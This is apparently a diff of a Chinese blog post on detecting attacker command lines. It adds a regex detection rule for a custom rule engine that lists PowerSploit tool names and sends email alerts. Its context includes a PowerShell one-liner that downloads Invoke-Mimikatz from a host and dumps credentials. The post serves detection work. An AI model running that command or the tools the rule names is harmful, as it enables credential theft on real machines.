@@ -300,8 +300,32 @@ output <span class="o">{</span>
 
 powershell IEX <span class="o">(</span>New-Object System.Net.Webclient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="se">\"</span>http://172.16.251.133/Exfiltration/Invoke-Mimikatz.ps1<span class="se">\"</span><span class="o">)</span><span class="p">;</span>Invoke-Mimikatz   -DumpCreds 
 </pre></div>
+<p>可以在kibana 看到如下内容</p>
 <p><img alt="sysmon" class="img-fluid" src="../images/WechatIMG86.jpeg"/></p>
 <p><img alt="sysmon" class="img-fluid" src="../images/WechatIMG87.jpeg"/></p>
+<p>我们在用Go自研的规则引擎里面添加如下规则（也可以用flink做）</p>
+<div class="highlight"><pre><span></span>state:     <span class="nb">enable</span>
+rule_id :  Hacker-Command-Line-01
+rule_tag:  Hacker-Command-Line-events
+rule_name: Hacker-Command-Line
+rule_type: or  
+
+detect_list:
+
+  - field : command_line
+    type: re
+    rule: <span class="o">(</span>Get-GPPAutologon<span class="p">|</span>Get-TimedScreenshot<span class="p">|</span>Invoke-DllInjection<span class="p">|</span>Invoke-Shellcode<span class="p">|</span>Invoke-WmiCommand<span class="p">|</span>Get-System<span class="p">|</span>Invoke-Mimikatz<span class="p">|</span>Invoke-NinjaCopy<span class="p">|</span>Out-Minidump<span class="o">)</span>
+    ignorecase: True
+
+threat_level : high
+auth : njcx
+info<span class="s2">": "</span>Hacking Command Line events<span class="s2">"</span>
+
+<span class="s2">e-mail:</span>
+<span class="s2">    - njcx@qq.com</span>
+<span class="s2">    - njcx91@qq.com</span>
+</pre></div>
+<p>规则引擎命中后，即会写es，同时给邮箱发送告警，方便许多。</p>
   </div>
 </article>
 <div id="cyReward" role="cylabs" data-use="reward" style="text-align:center;"></div>
